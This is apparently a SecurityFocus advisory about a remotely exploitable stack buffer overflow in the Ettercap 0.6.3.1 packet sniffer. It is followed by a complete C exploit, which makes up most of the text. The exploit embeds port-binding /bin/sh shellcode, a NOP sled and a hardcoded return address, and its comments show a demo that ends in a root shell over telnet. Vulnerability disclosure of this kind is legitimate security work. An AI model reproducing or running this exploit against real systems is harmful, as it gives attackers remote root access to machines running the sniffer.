source: http://www.securityfocus.com/bid/4104/info

Ettercap is a multipurpose packet sniffer for Linux and BSD based systems. It includes support for features such as character injection and packet filtering. Ettercap has been ported to Windows.

A remotely exploitable buffer overflow condition exists in Ettercap. If a large packet is recieved and passed to some decoders, stack data may be overwritten, leading to execution of arbitrary code. This condition may be caused by associating Ettercap with an interface with a larger MTU than ethernet, or by sending a forged packet with a misleading data length field.

Ettercap would normally be executed by the root user. Earlier versions of Ettercap may share this vulnerability.

/* 
 * ettercap-0.6.3.1 remote root xploit 
 *
 * By: Ferm?n J. Serna <fjserna@ngsec.com>
 *     Next Generation Security Technologies
 *     http://www.ngsec.com
 *
 * DESCRIPTION:
 * ============
 *
 * Several decoders (mysql, irc, ...) suffer the following problem:
 *
 *    memcpy(collector, payload, data_to_ettercap->datalen);
 *
 * collector is declared as: 
 *
 *    u_char collector[MAX_DATA];
 * 
 *  where MAX_DATA is:
 *
 *  #define MAX_DATA 2000
 *
 *  So on interfaces where MTU is higher than 2000 you can exploit 
 *  ettercap. Nop, normal ethernets have MTU:1500 ;P
 *
 *  Here are common MTU and interface types:
 * 
 *    65535 Hyperchannel
 *    17914 16 Mbit/sec token ring
 *    8166  Token Bus (IEEE 802.4)
 *    4464  4 Mbit/sec token ring (IEEE 802.5)
 *    1500  Ethernet
 *    1500  PPP (typical; can vary widely)
 *
 *  Sample explotation could be also in loopback interfaces: MTU:16436
 *
 *  piscis:~# ettercap -NszC -i lo &
 *  [1] 21887
 *  piscis:~# ./ettercap-x 0 | nc localhost mysql
 *  ettercap-0.6.3.1 xploit by Ferm?n J. Serna <fjserna@ngsec.com>
 *  Next Generation Security Technologies
 *  http://www.ngsec.com   
 *
 *  punt!
 *  piscis:~# telnet localhost 36864
 *  Trying 127.0.0.1...
 *  Connected to localhost.
 *  Escape character is '^]'.
 *  id;
 *  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 *
 *  Madrid, 5/02/2002
 *
 */ 


#include <stdio.h>
#include <string.h>

#define NUM_ADDR 100
#define NOP 0x41
#define BUFF_SIZE 2200
#define RET_ADDR 0xbfffea58
#define OFFSET 0

char shellcode[]=
"\x1b\xeb\x78\x5e\x29\xc0\x89\x46\x10\x40\x89\xc3\x89\x46\x0c\x40"
"\x89\x46\x08\x8d\x4e\x08\xb0\x66\xcd\x80\xeb\x01\x3C\x43\xc6\x46"
"\x10\x10\x66\x89\x5e\x14\x88\x46\x08\x29\xc0\x89\xc2\x89\x46\x18"
"\xb0\x90\x66\x89\x46\x16\x8d\x4e\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43\xb0\x66\xcd\x80\x89\x56\x0c\x89"
"\x56\x10\xb0\x66\x43\xcd\x80\xeb\x01\x2D\x86\xc3\xb0\x3f\x29\xc9"
"\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x88\x56\x07\x89"
"\x76\x0c\x87\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80\xe8\x83\xff\xff\xff"
"/bin/sh";

int main(int argc, char **argv) {
char buffer[BUFF_SIZE];
char *ch_ptr;
unsigned long *lg_ptr;
int aux;
int offset=OFFSET;

 fprintf(stderr,"ettercap-0.6.3.1 xploit by Ferm?n J. Serna <fjserna@ngsec.com>\n");
 fprintf(stderr,"Next Generation Security Technologies\n");
 fprintf(stderr,"http://www.ngsec.com\n\n");


 if (argc==2) offset=atoi(argv[1]);

 memset(buffer,0,sizeof(buffer));

 ch_ptr=buffer;
 memset(ch_ptr,NOP,sizeof(buffer)-strlen(shellcode)-4*NUM_ADDR);
 ch_ptr+=sizeof(buffer)-strlen(shellcode)-4*NUM_ADDR;
 memcpy(ch_ptr,shellcode,strlen(shellcode));
 ch_ptr+=strlen(shellcode);
 lg_ptr=(unsigned long *)ch_ptr;
 for (aux=0;aux<NUM_ADDR;aux++) *(lg_ptr++)=RET_ADDR+offset;
 ch_ptr=(char *)lg_ptr;
 *ch_ptr='\0';
  
 printf("%s",buffer);

 return(0);

}



